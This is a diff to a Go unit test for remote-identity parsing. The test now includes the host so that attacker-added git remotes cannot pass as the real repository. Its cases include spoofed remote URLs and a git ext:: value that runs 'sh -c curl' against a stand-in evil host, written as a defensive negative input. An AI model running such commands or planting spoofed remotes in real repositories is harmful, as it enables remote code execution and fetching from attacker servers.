@@ -59,30 +59,48 @@ func TestShortSHA(t *testing.T) {
 	}
 }
 
-// ghRemote must compare a remote's OWNER/REPO identity for equality, not look for
-// the desired repository as a substring of the URL: acme/widget is a substring of
-// acme/widget-fork and acme/widgets, and if such a remote sorts first the PR base
-// OID would be fetched from the wrong repository -- failing even though a correct
-// remote is configured.
+// ghRemote must compare a remote's HOST/OWNER/REPO identity for equality, not
+// look for the desired repository as a substring of the URL and not ignore the
+// server it lives on:
+//   - acme/widget is a substring of acme/widget-fork and acme/widgets, and if such
+//     a remote sorts first the PR base OID would be fetched from the wrong
+//     repository -- failing even though a correct remote is configured;
+//   - a checkout can add attacker.example/acme/widget next to the real
+//     github.com/acme/widget, and an identity that dropped the host would accept it
+//     as the PR's base repository and fetch from the attacker's server.
 func TestRemoteIdentity(t *testing.T) {
 	cases := []struct{ url, want string }{
-		{"https://github.com/acme/widget.git", "acme/widget"},
-		{"https://github.com/acme/widget", "acme/widget"},
-		{"https://github.com/Acme/Widget.git\n", "acme/widget"},
-		{"https://token:x-oauth-basic@github.com/acme/widget.git", "acme/widget"},
-		{"http://ghe.example.com/acme/widget.git", "acme/widget"},
-		{"ssh://git@github.com:22/acme/widget.git", "acme/widget"},
-		{"git@github.com:acme/widget.git", "acme/widget"},
-		{"git@github.com:acme/widget", "acme/widget"},
+		{"https://github.com/acme/widget.git", "github.com/acme/widget"},
+		{"https://github.com/acme/widget", "github.com/acme/widget"},
+		{"https://github.com/Acme/Widget.git\n", "github.com/acme/widget"},
+		{"https://token:x-oauth-basic@github.com/acme/widget.git", "github.com/acme/widget"},
+		{"http://ghe.example.com/acme/widget.git", "ghe.example.com/acme/widget"},
+		{"git@github.com:acme/widget.git", "github.com/acme/widget"},
+		{"git@github.com:acme/widget", "github.com/acme/widget"},
+		// A port that is the scheme's default names no other endpoint, so these
+		// still match the canonical https URL gh reports for the same repository.
+		{"ssh://git@github.com:22/acme/widget.git", "github.com/acme/widget"},
+		{"https://github.com:443/acme/widget.git", "github.com/acme/widget"},
 		// The near misses a substring test would accept.
-		{"https://github.com/acme/widget-fork.git", "acme/widget-fork"},
-		{"https://github.com/acme/widgets.git", "acme/widgets"},
-		{"git@github.com:acme/widget-fork.git", "acme/widget-fork"},
-		// Not an owner/repo remote at all: no identity to compare, so ghRemote falls
-		// back to origin rather than matching by accident.
+		{"https://github.com/acme/widget-fork.git", "github.com/acme/widget-fork"},
+		{"https://github.com/acme/widgets.git", "github.com/acme/widgets"},
+		{"git@github.com:acme/widget-fork.git", "github.com/acme/widget-fork"},
+		// The near misses an owner/repo-only identity would accept: another server
+		// serving the same owner/repo path, a host-shaped username in front of the
+		// real host, and another endpoint on the same host.
+		{"https://attacker.example/acme/widget.git", "attacker.example/acme/widget"},
+		{"https://github.com@attacker.example/acme/widget.git", "attacker.example/acme/widget"},
+		{"git@attacker.example:acme/widget.git", "attacker.example/acme/widget"},
+		{"https://ghe.example.com:8443/acme/widget.git", "ghe.example.com:8443/acme/widget"},
+		{"ssh://git@[::1]:2222/acme/widget.git", "[::1]:2222/acme/widget"},
+		{"ssh://git@[::1]/acme/widget.git", "[::1]/acme/widget"},
+		// Not an owner/repo remote at all: no identity to compare, so ghRemote
+		// refuses (or falls back) rather than matching by accident.
 		{"/srv/git/widget.git", ""},
 		{"file:///srv/git/acme/widget.git", ""},
 		{"https://github.com/acme", ""},
+		{"https:///acme/widget.git", ""},
+		{`ext::sh -c "curl https://evil.example/x"`, ""},
 		{"", ""},
 	}
 	for _, tc := range cases {
